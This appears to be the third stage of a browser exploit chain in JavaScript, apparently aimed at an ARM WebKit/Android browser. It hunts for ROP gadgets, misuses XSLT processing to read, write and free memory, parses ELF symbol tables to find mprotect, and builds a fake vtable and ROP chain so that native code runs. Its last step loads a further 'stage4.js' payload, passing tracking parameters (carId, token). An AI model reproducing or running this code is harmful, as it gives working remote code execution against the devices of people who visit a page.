function gadget1_fastheur(e, t) {
    var r = e.findstring("标桽䞨", t, 2097152);
    return null === r ? null: {
        addr: r,
        reg: 5,
        disp: 4
    }
}
function gadget1_slowsearch(e, t, r) {
    r.obj.nodeValue = "gadget1_slowsearch";
    var a = t.read32(r.addr + r.dataoffset),
    i = t.read32(a + 8),
    s = t.read32(a + 4);
    t.write32(a + 8, e.addr),
    t.write32(a + 4, e.size / 2);
    for (var o = 0;;) {
        var n = r.obj.nodeValue.indexOf("标", o);
        if ( - 1 == n) return t.write32(a + 8, i),
        t.write32(a + 4, s),
        null;
        o = n + 1;
        var d = e.addr + 2 * n,
        l = t.read16(d + 2);
        if (26624 == (63488 & l)) {
            var h = t.read16(d + 4);
            if (18304 == (65408 & h)) {
                var c = (l >> 6 & 31) << 2,
                f = l >> 3 & 7,
                u = 7 & l,
                p = h >> 3 & 7,
                m = t.read16(d);
                if (7 == f && u == p && 8 != c && 12 != c && !(c > 80 && c < 192) && 1 != u && 7 != u && 6 != u) return ENABLE_DEBUG && (INFO("Found Gadget 1 @ " + hex(d) + " (" + hex(d - e.addr) + ")"), INFO("  \\x" + hex(t.read8(d + 0), 2) + "\\x" + hex(t.read8(d + 1), 2) + "\\x" + hex(t.read8(d + 2), 2) + "\\x" + hex(t.read8(d + 3), 2) + "\\x" + hex(t.read8(d + 4), 2) + "\\x" + hex(t.read8(d + 5), 2)), INFO("  " + hex(m, 4) + " LDR R7, [R0]"), INFO("  " + hex(l, 4) + " LDR R" + u + ", [R" + f + ", #0x" + hex(c) + "]"), INFO("  " + hex(h, 4) + " BLX R" + p), INFO(" ")),
                t.write32(a + 8, i),
                t.write32(a + 4, s),
                {
                    addr: d,
                    reg: u,
                    disp: c
                }
            }
        }
    }
}
function stage3_alternate(e, t, r, a, i, s) {
    var o = {};
    if (o.ggt2 = {
        addr: s.findstring("퀈䠐퀌＞", t)
    },
    check_gadgets(o), o.ggt1 = {
        addr: i.findstring("뀀 Ｒ", t)
    },
    check_gadgets(o), o.str_r1_r4 = {
        addr: i.findstring("怡뵰", t),
        disp: 0
    },
    check_gadgets(o), o.pop_r0_pc = {
        addr: s.findstring("老", t)
    },
    check_gadgets(o), o.pop_r1__r5_pc = {
        addr: i.findstring("봾", t)
    },
    check_gadgets(o), INFO("--- Gadget search completed --- "), ENABLE_DEBUG) for (var n in o) {
        var d = "";
        for (var l in o[n])"addr" != l && (d += l + ": " + o[n][l] + " ");
        "" !== d && (d = "[ " + d + "]"),
        INFO("  " + hex(o[n].addr, 8) + " " + n + "  " + d)
    }
    for (var h = r + 32768,
    c = 0; c < 94; c++) e.write32(h + 4 * c, o.ggt1.addr);
    var f = r + 33792;
    e.write32(h - 8, 3124970307),
    e.write32(h - 4, f + 8),
    e.write32(h + 0, o.ggt2.addr),
    e.write32(h + 4, 3125167686),
    e.write32(h + 8, o.ggt2.addr);
    var u = s.findsymbol("mprotect");
    INFO("mprotect address: " + hex(u)),
    INFO("Stack will be written in " + hex(r + 33536 + o.str_r1_r4.disp));
    var p = r + 40960,
    m = [r + 33536, 3735928549, o.str_r1_r4.addr + 1, 3735928544, 3735928548, 3735928552, 3735928548, 3735928549, 3735928550, o.pop_r0_pc.addr, a.base, o.pop_r1__r5_pc.addr + 1, a.size - 256, 7, 0, f + 4, 0, u, 3735927508, 3735927509, 3735927510, p];
    for (var b in m) e.write32(f + 4 * b, m[b]);
    var g = r + 24576;
    e.write32(g + 0, 0),
    e.write32(g + 4, 0),
    e.write32(g + 8, 0),
    e.write32(g + 12, 0),
    e.write32(g + 16, 0),
    e.write32(g + 20, 0),
    e.write32(g + 24, 0),
    e.write32(g + 28, 0);
    for (b = 0; b < CALLSTUB.length; b++) e.write8(p + b, CALLSTUB[b]);
    var y = i.addr,
    w = i.addr + i.size,
    v = i.findreloc("_ZN2v87Context5EnterEv");
    if (null !== v) {
        INFO("v8 is separate from libwebcore. Adjusting checks...");
        var x = e.findimagebase(v);
        y = (x = new ELFObject(x, e)).addr,
        w = x.addr + x.size
    }
    for (b = 0; b < CALLSTUB.length / 4; b++) switch (e.read32(p + 4 * b)) {
    case 3134905600:
        e.write32(p + 4 * b, r + 33536 + o.str_r1_r4.disp);
        break;
    case 3134905601:
        e.write32(p + 4 * b, i.addr);
        break;
    case 3134905602:
        e.write32(p + 4 * b, i.addr + i.size);
        break;
    case 3134905603:
        e.write32(p + 4 * b, y);
        break;
    case 3134905604:
        e.write32(p + 4 * b, w);
        break;
    case 3134905605:
        e.write32(p + 4 * b, g);
        break;
    case 3134905606:
        e.write32(p + 4 * b, 1)
    }
    var O = e.read32(t.addr);
    e.write32(t.addr, h),
    t.obj.nodeValue = "x",
    e.write32(t.addr, O),
    INFO("Got out of function call. Building RCECall");
    var E = e.read32(g);
    e.write32(g, 0),
    trk *= E,
    download_stage4(e, new RCE(e, t, g, p, h), s, i, r, trk)
}
function download_stage4(e, t, r, a, i, s) {
    var o = document.createElement("script");
    o.type = "text/javascript",
    o.onload = function() {
        window.stage4(e, t, r, a, i)
    },
    o.src = "stage4.js?trk=" + s.toString() + "&carId=" + (findGetParameter("carId") || "null") + "&token=" + (findGetParameter("token") || "null") + "&agent=" + (findGetParameter("agent") || "offical"),
    document.getElementsByTagName("head")[0].appendChild(o),
    alert(o.src)
}
function RCE(e, t, r, a, i) {
    this.node = t,
    this.structfn = r,
    this.callstub = a,
    this.memobj = e,
    this.fakevtable = i
}
function XSLTObject(e, t, r, a, i) {
    void 0 === e && ERR("XSLTObject: A page object is required."),
    void 0 === t && ERR("XSLTObject: A children address is required."),
    void 0 === r && ERR("XSLTObject: A name address is required."),
    void 0 === a && ERR("XSLTObject: A root element address is required."),
    void 0 === i && ERR("XSLTObject: An xml document object is required."),
    window.g_xsltobj = this,
    this.alive = !0,
    this.page = e,
    this.ca = t,
    this.na = r,
    this.ea = a,
    this.xml = i,
    INFO("Creating XSLTObject: ca " + hex(this.ca, 8) + " na " + hex(this.na, 8) + " ea " + hex(this.ea, 8));
    for (var s = 0; s < 6144; s++) e.write(this.ca + 4 * s, 0)
}
function BufferMemoryObject(e) {
    void 0 === e && ERR("BufferMemoryObject: an array is required"),
    this.arraybuffer = e,
    this.view = new DataView(e)
}
function ELFObject(e, t) {
    void 0 === e && ERR("ELFObject: an address is required"),
    void 0 === t && ERR("ELFObject: a memory object is required"),
    this.addr = e,
    this.memobj = t,
    INFO("--- ELF data ---"),
    this.initsymtab(),
    this.readgot(),
    INFO("--- ELF read ---")
}
window.RCE = RCE,
RCE.prototype.call = function(e, t, r, a, i, s, o) {
    void 0 !== e && null !== e || ERR("RCE: function address cannot be " + e),
    void 0 === t && (t = 0),
    void 0 === r && (r = 0),
    void 0 === a && (a = 0),
    void 0 === i && (i = 0),
    void 0 === s && (s = 0),
    void 0 === o && (o = 0),
    !1 === o && (o = 0),
    !0 === o && (o = 1),
    0 !== o && 1 !== o && ERR("RCE.call: forking cannot be " + o.toString()),
    this.memobj.write32(this.structfn + 0, e),
    this.memobj.write32(this.structfn + 4, o),
    this.memobj.write32(this.structfn + 8, t),
    this.memobj.write32(this.structfn + 12, r),
    this.memobj.write32(this.structfn + 16, a),
    this.memobj.write32(this.structfn + 20, i),
    this.memobj.write32(this.structfn + 24, s);
    var n = this.memobj.read32(this.node.addr);
    if (this.memobj.read32(this.fakevtable) != this.callstub) for (var d = 0; d < 94; d++) this.memobj.write32(this.fakevtable + 4 * d, this.callstub);
    return this.memobj.write32(this.node.addr, this.fakevtable),
    this.node.obj.nodeValue = "x",
    this.memobj.write32(this.node.addr, n),
    this.memobj.read32(this.structfn + 28)
},
RCE.prototype.call = RCE.prototype.call,
RCE.prototype.forkingcall = function(e, t, r, a, i, s) {
    return void 0 !== e && null !== e || ERR("RCE: function address cannot be " + e),
    void 0 === t && (t = 0),
    void 0 === r && (r = 0),
    void 0 === a && (a = 0),
    void 0 === i && (i = 0),
    void 0 === s && (s = 0),
    this.call(e, t, r, a, i, s, !0)
},
RCE.prototype.forkingcall = RCE.prototype.forkingcall,
XSLTObject.prototype.processXSL = function(e) {
    var t = new XSLTProcessor,
    r = parseXML(e);
    return t.importStylesheet(r),
    t.transformToDocument(this.xml)
},
XSLTObject.prototype.zero = function(e) {
    this.page.write(this.ca + 4, 14),
    this.page.write(this.ca + 24, 0),
    this.page.write(this.ca + 28, e - 24);
    this.processXSL('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" ><xsl:template match="/*">  <xsl:apply-templates/></xsl:template></xsl:stylesheet>'),
    this.page.write(this.ca + 4, 0),
    this.page.write(this.ca + 28, 0)
},
XSLTObject.prototype.free = function(e) {
    this.page.write(this.ca + 4, 14),
    this.page.write(this.ca + 24, e),
    this.page.write(e + 4, 2989);
    this.processXSL('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/*">  <xsl:apply-templates/></xsl:template></xsl:stylesheet>');
    this.page.write(this.ca + 4, 0),
    this.page.write(this.ca + 24, 0)
},
XSLTObject.prototype.readstring = function(e) {
    var t = this.page.read(this.ca + 4),
    r = this.page.read(this.ca + 40);
    this.page.write(this.ca + 4, 3),
    this.page.write(this.ca + 40, e);
    var a = this.processXSL('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:xq="http://www.w3.org/2002/08/xquery-functions" version="1.0" ><xsl:template match="/*"><data>DATA=<xsl:value-of select="xq:escape-uri(text(), false())" /></data></xsl:template></xsl:stylesheet>');
    void 0 === a && ERR("XSLTObject.readstring: cannot process XSLT.");
    var i = a.getElementsByTagName("data")[0].childNodes[0].nodeValue.slice(5);
    return this.page.write(this.ca + 4, t),
    this.page.write(this.ca + 40, r),
    i
},
XSLTObject.prototype.readbytes = function(e, t) {
    void 0 === e && ERR("XSLTObject.readbytes: an address is required"),
    void 0 === t && ERR("XSLTObject.readbytes: a number of bytes is required");
    for (var r, a = [], i = e, s = 0, o = 0; s < t;) {
        for (r = this.readstring(i), o = 0; s < t && o < r.length;)"%" == r[o] ? (a.push(parseInt(r.slice(o + 1, o + 3), 16)), o += 3) : (a.push(r.charCodeAt(o)), o += 1),
        s += 1;
        s < t && (a.push(0), s += 1),
        i = e + s
    }
    return a
},
XSLTObject.prototype.read32 = function(e) {
    var t = this.readbytes(e, 4);
    return (t[0] | t[1] << 8 | t[2] << 16 | t[3] << 24 >>> 0) >>> 0
},
XSLTObject.prototype.terminate = function() {
    this.zero(this.ea + 40),
    this.page.write(this.na + 256, stringtoarray("qel")),
    this.page.write(this.ca + 4, 1),
    this.page.write(this.ca + 8, this.na + 256),
    this.page.write(this.ca + 12, this.ca + 128),
    this.page.write(this.ca + 24, this.ca + 64),
    this.page.write(this.ca + 64 + 4, 1),
    this.page.write(this.ca + 64 + 8, this.na + 256),
    this.page.write(this.ca + 64 + 12, this.ca + 176),
    this.page.write(this.ca + 128 + 4, 14),
    this.page.write(this.ca + 128 + 24, 0),
    this.page.write(this.ca + 128 + 28, this.ea + 8 - 24),
    this.page.write(this.ca + 176 + 4, 14),
    this.page.write(this.ca + 176 + 24, 0),
    this.page.write(this.ca + 176 + 28, this.ea + 12 - 24);
    this.processXSL('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" ><xsl:template match="qel">  <xsl:apply-templates/></xsl:template><xsl:template match="/*">  <xsl:apply-templates/></xsl:template></xsl:stylesheet>'),
    this.alive = !1
},
XSLTObject.prototype.set_root_name = function(e) {
    this.page.write(this.na, stringtoarray(e))
},
XSLTObject.prototype.get_root_name = function() {
    var e = this.processXSL('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" ><xsl:template match="/*"><data><xsl:value-of select="local-name()" /></data></xsl:template></xsl:stylesheet>');
    void 0 === e && ERR("XSLTObject.test: cannot process XSLT.");
    var t = e.getElementsByTagName("data")[0];
    return void 0 === t && ERR("XSLTObject.test: cannot process XSLT data field."),
    t.childNodes[0].nodeValue
},
window.BufferMemoryObject = BufferMemoryObject,
BufferMemoryObject.prototype.write32 = function(e, t) {
    this.view.setUint32(e, t, !0)
},
BufferMemoryObject.prototype.write32 = BufferMemoryObject.prototype.write32,
BufferMemoryObject.prototype.read32 = function(e) {
    return this.view.getUint32(e, !0) >>> 0
},
BufferMemoryObject.prototype.read32 = BufferMemoryObject.prototype.read32,
BufferMemoryObject.prototype.write8 = function(e, t) {
    this.view.setUint8(e, t)
},
BufferMemoryObject.prototype.write8 = BufferMemoryObject.prototype.write8,
BufferMemoryObject.prototype.read8 = function(e) {
    return this.view.getUint8(e)
},
BufferMemoryObject.prototype.read8 = BufferMemoryObject.prototype.read8,
BufferMemoryObject.prototype.write16 = function(e, t) {
    this.view.setUint16(e, t, !0)
},
BufferMemoryObject.prototype.write16 = BufferMemoryObject.prototype.write16,
BufferMemoryObject.prototype.read16 = function(e) {
    return this.view.getUint16(e, !0)
},
BufferMemoryObject.prototype.read16 = BufferMemoryObject.prototype.read16,
BufferMemoryObject.prototype.writearray = function(e, t) {
    for (var r = 0; r < t.length; r++) this.write8(e + r, t[r])
},
BufferMemoryObject.prototype.writearray = BufferMemoryObject.prototype.writearray,
BufferMemoryObject.prototype.writestring = function(e, t) {
    for (var r = stringtoarray(t, !0), a = 0; a < r.length; a++) this.write8(e + a, r[a])
},
BufferMemoryObject.prototype.writestring = BufferMemoryObject.prototype.writestring,
BufferMemoryObject.prototype.find32 = function(e, t, r) {
    void 0 === e && ERR("find32: a start address is required"),
    void 0 === t && ERR("find32: An end address is required"),
    void 0 === r && ERR("find32: An array is required"),
    "number" == typeof r && (r = [r]);
    for (var a = e; a < t;) {
        for (var i = a,
        s = 0; s < r.length && this.read32(i) == r[s]; s++) {
            if (s == r.length - 1) return a;
            i += 4
        }
        a += 4
    }
    return null
},
BufferMemoryObject.prototype.find32 = BufferMemoryObject.prototype.find32,
BufferMemoryObject.prototype.find16 = function(e, t, r) {
    void 0 === e && ERR("find16: a start address is required"),
    void 0 === t && ERR("find16: An end address is required"),
    void 0 === r && ERR("find16: An array or value is required"),
    "number" == typeof r && (r = [r]);
    for (var a = e; a < t;) {
        for (var i = a,
        s = 0; s < r.length && this.read16(i) == r[s]; s++) {
            if (s == r.length - 1) return a;
            i += 2
        }
        a += 2
    }
    return null
},
BufferMemoryObject.prototype.find16 = BufferMemoryObject.prototype.find16,
BufferMemoryObject.prototype.findimagebase = function(e) {
    for (e = (4294963200 & e) >>> 0; 1179403647 != this.read32(e) || 257 != this.read16(e + 4);) e -= 4096;
    return e
},
BufferMemoryObject.prototype.findimagebase = BufferMemoryObject.prototype.findimagebase,
BufferMemoryObject.prototype.readstring = function(e) {
    for (var t, r = []; 0 != (t = this.read8(e));) r.push(t),
    e++;
    return arraytostring(r)
},
BufferMemoryObject.prototype.readstring = BufferMemoryObject.prototype.readstring,
window.ELFObject = ELFObject,
ELFObject.prototype.initsymtab = function() {
    var e, t = this.addr + this.memobj.read32(this.addr + 28),
    r = this.memobj.read16(this.addr + 44),
    a = t;
    this.dynamic = null,
    this.size = null;
    for (var i = 0; i < r; i++) {
        if (2 == (e = this.memobj.read32(a)) && (this.dynamic = this.addr + this.memobj.read32(a + 8)), 1 == e) if (5 == this.memobj.read32(a + 24)) {
            var s = this.memobj.read32(a + 8),
            o = this.memobj.read32(a + 20);
            0 == s && (this.size = o)
        }
        if (null !== this.dynamic && null !== this.size) break;
        a += 32
    }
    null === this.dynamic && ERR("ELFObject: cannot find phdr DYNAMIC"),
    null === this.size && ERR("ELFObject: cannot find phdr LOAD");
    var n, d, l = this.dynamic,
    h = {
        2 : "pltrelsz",
        4 : "hashtab",
        5 : "strtab",
        6 : "symtab",
        23 : "jmprel"
    };
    for (n in this.dyntable = {},
    h) this.dyntable[h[n]] = null;
    for (; 0 != (n = this.memobj.read32(l));) {
        n in h && (this.dyntable[h[n]] = this.memobj.read32(l + 4)),
        l += 8;
        var c = !0;
        for (d in this.dyntable) if (null === this.dyntable[d]) {
            c = !1;
            break
        }
        if (!1 !== c) break
    }
    for (d in this.dyntable) null === this.dyntable[d] && ERR("ELFObject: Couldn't get " + d + " from DYNAMIC");
    for (d in this.dyntable.strtab += this.addr, this.dyntable.hashtab += this.addr, this.dyntable.symtab += this.addr, this.dyntable.jmprel += this.addr, this.dyntable) INFO("  " + d + " = " + this.dyntable[d].toString(16))
},
ELFObject.prototype.findgadget16 = function(e, t) {
    return void 0 === t && (t = 0),
    this.memobj.find16(this.addr + t, this.addr + this.size, e)
},
ELFObject.prototype.findstring = function(e, t, r) {
    void 0 === e && ERR("findstring: a string is required"),
    void 0 === t && ERR("findstring: a node is required"),
    void 0 === r && (r = 0);
    var a = Math.floor(1e5 * Math.random() + 1);
    t.obj.nodeValue = "ELFObject_findstring_" + a;
    var i = this.memobj.read32(t.addr + t.dataoffset),
    s = this.memobj.read32(i + 8),
    o = this.memobj.read32(i + 4);
    this.memobj.write32(i + 8, this.addr),
    this.memobj.write32(i + 4, this.size / 2);
    var n = r / 2,
    d = t.obj.nodeValue.indexOf(e, n);
    return this.memobj.write32(i + 8, s),
    this.memobj.write32(i + 4, o),
    -1 == d ? null: this.addr + 2 * d
},
ELFObject.prototype.readgot = function() {
    this.got = {};
    var e = this.dyntable.pltrelsz / 8;
    ENABLE_DEBUG && INFO("  GOT = " + (this.addr + this.memobj.read32(this.dyntable.jmprel)).toString(16));
    for (var t = 0; t < e; t++) {
        var r = this.memobj.read32(this.addr + this.memobj.read32(this.dyntable.jmprel + 8 * t)),
        a = this.memobj.read32(this.dyntable.jmprel + 8 * t + 4) >>> 8;
        this.got[a] = r
    }
},
ELFObject.prototype.dumpjmprel = function() {
    for (var e = this.dyntable.pltrelsz / 8,
    t = 0; t < e; t++) {
        var r = this.memobj.read32(this.addr + this.memobj.read32(this.dyntable.jmprel + 8 * t)),
        a = this.memobj.read32(this.dyntable.jmprel + 8 * t + 4) >>> 8,
        i = this.memobj.read32(this.dyntable.symtab + 16 * a);
        i = this.memobj.readstring(i + this.dyntable.strtab),
        INFO(r.toString(16) + " : " + i)
    }
},
ELFObject.prototype.findreloc = function(e) {
    var t = this.findindex(e);
    return null === t ? null: this.got[t]
},
ELFObject.prototype.findreloc = ELFObject.prototype.findreloc,
ELFObject.prototype.findsymbol = function(e) {
    var t = this.findindex(e);
    return null === t ? null: this.memobj.read32(this.dyntable.symtab + 16 * t + 4) + this.addr
},
ELFObject.prototype.requiresymbol = function(e) {
    var t = this.findsymbol(e);
    return void 0 !== t && 0 !== t || ERR("Cannot find required symbol " + e),
    t
},
ELFObject.prototype.requiresymbol = ELFObject.prototype.requiresymbol,
ELFObject.prototype.findindex = function(e) {
    void 0 === this.hashtab && (this.hashtab = {},
    this.hashtab.addr = this.dyntable.hashtab, this.hashtab.nbucket = this.memobj.read32(this.hashtab.addr), this.hashtab.nchain = this.memobj.read32(this.hashtab.addr + 4), this.hashtab.bucket = this.hashtab.addr + 8, this.hashtab.chain = this.hashtab.addr + 8 + 4 * this.hashtab.nbucket);
    for (var t, r = this.hash(e), a = this.memobj.read32(this.hashtab.bucket + r % this.hashtab.nbucket * 4);;) {
        if (0 == (t = this.memobj.read32(this.dyntable.symtab + 16 * a))) return null;
        if ((t = this.memobj.readstring(t + this.dyntable.strtab)) == e) return a;
        if (0 == (a = this.memobj.read32(this.hashtab.chain + 4 * a))) return null
    }
},
ELFObject.prototype.hash = function(e) {
    void 0 === e && ERR("ELFObject.hash: a string is required");
    for (var t, r = function(e) {
        return (e >>> 0 & 4294967295) >>> 0
    },
    a = 0, i = 0; i < e.length; i++) 0 !== (t = r(4026531840 & (a = r(r(a << 4) + e.charCodeAt(i))))) && (a = r(a ^ r(t >>> 24))),
    a = r(a & r(4294967295 ^ t));
    return a
};
